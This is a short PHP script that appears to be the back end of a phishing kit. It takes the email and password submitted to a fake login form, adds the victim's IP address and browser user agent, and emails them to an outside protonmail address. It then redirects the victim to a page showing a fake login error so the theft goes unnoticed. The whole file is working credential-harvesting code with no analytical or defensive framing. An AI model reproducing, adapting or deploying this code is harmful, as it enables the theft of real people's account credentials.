<?php
$ip = $_SERVER['REMOTE_ADDR'];
$time = $_SERVER['HTTP_USER_AGENT'];

$msg  = "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "Sent from $ip on $time\n";

$email = @$_REQUEST['email'];

if (! empty($_POST))
{
$to = "moonshine.jsterre@protonmail.com";
$subject = "A L";

mail($to,$subject,$msg);
header("Location: e.html?em=$email&login_error=1");
}
?>
